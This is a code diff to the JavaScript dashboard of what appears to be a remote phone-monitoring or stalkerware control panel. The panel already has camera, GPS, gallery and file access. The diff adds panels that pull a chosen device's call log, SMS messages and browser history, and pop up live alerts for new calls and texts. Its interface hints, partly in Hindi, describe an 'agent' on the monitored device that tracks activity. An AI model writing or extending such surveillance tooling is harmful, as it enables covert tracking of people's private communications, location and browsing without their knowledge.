@@ -122,7 +122,8 @@ function showDeviceActions(deviceId) {
 
 function updateDeviceSelects() {
   var selects = ['cameraDeviceSelect', 'gpsDeviceSelect', 'galleryDeviceSelect',
-                 'filesDeviceSelect', 'infoDeviceSelect', 'emergencyDeviceSelect'];
+                 'filesDeviceSelect', 'calllogDeviceSelect', 'smsDeviceSelect',
+                 'historyDeviceSelect', 'infoDeviceSelect', 'emergencyDeviceSelect'];
 
   selects.forEach(function(selId) {
     var sel = document.getElementById(selId);
@@ -552,6 +553,229 @@ function downloadGalleryPhoto(photoId, fileName) {
   socket.on('gallery:photo', handler);
   socket.emit('command:gallery:get', { deviceId: deviceId, photoId: photoId });
   showToast('Downloading...', 'info');
+}
+
+// ---- Call Log ----
+let callLogData = [];
+
+function getSelectedCalllogDevice() {
+  return document.getElementById('calllogDeviceSelect').value;
+}
+
+function onCalllogDeviceChange() {
+  callLogData = [];
+  updateCallLogList();
+}
+
+function fetchCallLog() {
+  var deviceId = getSelectedCalllogDevice();
+  if (!deviceId) { showToast('Please select a device first', 'error'); return; }
+  socket.emit('command:calllog:fetch', { deviceId: deviceId });
+  showToast('Fetching call log...', 'info');
+}
+
+socket.on('calllog:data', function(data) {
+  if (data.calls && data.calls.length > 0) {
+    callLogData = data.calls;
+    updateCallLogList();
+    document.getElementById('calllogCount').textContent = callLogData.length + ' calls';
+    showToast(callLogData.length + ' calls found', 'success');
+  } else {
+    callLogData = [];
+    updateCallLogList();
+    document.getElementById('calllogCount').textContent = data.note || 'No calls found';
+    if (data.note) showToast(data.note, 'info');
+  }
+});
+
+socket.on('notification:new', function(data) {
+  if (data.type === 'call') {
+    showToast('New call detected: ' + (data.title || data.body), 'info');
+    callLogData.unshift({
+      number: data.body || data.title,
+      type: 'incoming',
+      timestamp: data.timestamp,
+      duration: '--'
+    });
+    updateCallLogList();
+    document.getElementById('calllogCount').textContent = callLogData.length + ' calls';
+  } else if (data.type === 'sms') {
+    showToast('New SMS: ' + (data.title || ''), 'info');
+    smsData.unshift({
+      from: data.title || 'Unknown',
+      body: data.body || '',
+      timestamp: data.timestamp,
+      read: false
+    });
+    updateSmsList();
+    document.getElementById('smsCount').textContent = smsData.length + ' messages';
+  }
+});
+
+function updateCallLogList() {
+  var list = document.getElementById('callLogList');
+  if (callLogData.length === 0) {
+    list.innerHTML =
+      '<div class="empty-state" style="padding:60px 20px">' +
+        '<div class="icon">📞</div>' +
+        '<h3>No Call Log</h3>' +
+        '<p>Calls will appear here when notifications are received</p>' +
+        '<p style="font-size:13px;color:var(--text-muted);margin-top:8px">Device par notification access allow karna padega</p>' +
+      '</div>';
+    return;
+  }
+
+  list.innerHTML = '';
+  callLogData.forEach(function(call) {
+    var item = document.createElement('div');
+    item.className = 'log-item';
+    var icon = call.type === 'incoming' ? '📲' : call.type === 'outgoing' ? '📱' : '📵';
+    var time = call.timestamp ? new Date(call.timestamp).toLocaleString() : '--';
+    item.innerHTML =
+      '<div class="log-icon">' + icon + '</div>' +
+      '<div class="log-info">' +
+        '<div class="log-title">' + escapeHtml(call.number || 'Unknown') + '</div>' +
+        '<div class="log-meta">' + escapeHtml(call.type || 'call') + ' | ' + time + '</div>' +
+      '</div>' +
+      '<div class="log-duration">' + (call.duration || '--') + '</div>';
+    list.appendChild(item);
+  });
+}
+
+// ---- SMS ----
+let smsData = [];
+
+function getSelectedSmsDevice() {
+  return document.getElementById('smsDeviceSelect').value;
+}
+
+function onSmsDeviceChange() {
+  smsData = [];
+  updateSmsList();
+}
+
+function fetchSms() {
+  var deviceId = getSelectedSmsDevice();
+  if (!deviceId) { showToast('Please select a device first', 'error'); return; }
+  socket.emit('command:sms:fetch', { deviceId: deviceId });
+  showToast('Fetching SMS...', 'info');
+}
+
+socket.on('sms:data', function(data) {
+  if (data.messages && data.messages.length > 0) {
+    smsData = data.messages;
+    updateSmsList();
+    document.getElementById('smsCount').textContent = smsData.length + ' messages';
+    showToast(smsData.length + ' messages found', 'success');
+  } else {
+    smsData = [];
+    updateSmsList();
+    document.getElementById('smsCount').textContent = data.note || 'No messages found';
+    if (data.note) showToast(data.note, 'info');
+  }
+});
+
+function updateSmsList() {
+  var list = document.getElementById('smsList');
+  if (smsData.length === 0) {
+    list.innerHTML =
+      '<div class="empty-state" style="padding:60px 20px">' +
+        '<div class="icon">💬</div>' +
+        '<h3>No SMS Messages</h3>' +
+        '<p>SMS will appear here when notifications are received</p>' +
+        '<p style="font-size:13px;color:var(--text-muted);margin-top:8px">Device par notification access allow karna padega</p>' +
+      '</div>';
+    return;
+  }
+
+  list.innerHTML = '';
+  smsData.forEach(function(msg) {
+    var item = document.createElement('div');
+    item.className = 'log-item sms-item';
+    var time = msg.timestamp ? new Date(msg.timestamp).toLocaleString() : '--';
+    item.innerHTML =
+      '<div class="log-icon">💬</div>' +
+      '<div class="log-info">' +
+        '<div class="log-title">' + escapeHtml(msg.from || 'Unknown') + '</div>' +
+        '<div class="log-body">' + escapeHtml(msg.body || '') + '</div>' +
+        '<div class="log-meta">' + time + '</div>' +
+      '</div>';
+    list.appendChild(item);
+  });
+}
+
+// ---- Browser History ----
+let historyData = [];
+
+function getSelectedHistoryDevice() {
+  return document.getElementById('historyDeviceSelect').value;
+}
+
+function onHistoryDeviceChange() {
+  historyData = [];
+  updateHistoryList();
+}
+
+function fetchHistory() {
+  var deviceId = getSelectedHistoryDevice();
+  if (!deviceId) { showToast('Please select a device first', 'error'); return; }
+  socket.emit('command:history:fetch', { deviceId: deviceId });
+  showToast('Fetching history...', 'info');
+}
+
+function clearHistoryList() {
+  historyData = [];
+  updateHistoryList();
+  document.getElementById('historyCount').textContent = '';
+}
+
+socket.on('history:data', function(data) {
+  if (data.history && data.history.length > 0) {
+    historyData = data.history;
+    updateHistoryList();
+    document.getElementById('historyCount').textContent = historyData.length + ' entries';
+    showToast(historyData.length + ' history entries', 'success');
+  } else {
+    historyData = [];
+    updateHistoryList();
+    document.getElementById('historyCount').textContent = 'No history yet';
+    showToast('No browsing history yet', 'info');
+  }
+});
+
+function updateHistoryList() {
+  var list = document.getElementById('historyList');
+  if (historyData.length === 0) {
+    list.innerHTML =
+      '<div class="empty-state" style="padding:60px 20px">' +
+        '<div class="icon">🕐</div>' +
+        '<h3>No History</h3>' +
+        '<p>Browsing activity will be tracked while agent is connected</p>' +
+        '<p style="font-size:13px;color:var(--text-muted);margin-top:8px">Agent page open hone ke baad ki activity track hogi</p>' +
+      '</div>';
+    return;
+  }
+
+  list.innerHTML = '';
+  // Show in reverse chronological order
+  var sorted = historyData.slice().sort(function(a, b) { return b.timestamp - a.timestamp; });
+  sorted.forEach(function(entry) {
+    var item = document.createElement('div');
+    item.className = 'log-item';
+    var time = entry.timestamp ? new Date(entry.timestamp).toLocaleString() : '--';
+    var icon = '🌐';
+    if (entry.type === 'navigation') icon = '🔗';
+    if (entry.type === 'pushState') icon = '➡️';
+
+    item.innerHTML =
+      '<div class="log-icon">' + icon + '</div>' +
+      '<div class="log-info">' +
+        '<div class="log-title">' + escapeHtml(entry.title || entry.url || 'Unknown') + '</div>' +
+        '<div class="log-meta">' + escapeHtml(entry.url || '') + '</div>' +
+        '<div class="log-meta">' + time + ' | ' + (entry.type || '') + '</div>' +
+      '</div>';
+    list.appendChild(item);
+  });
 }
 
 // ---- Device Info ----
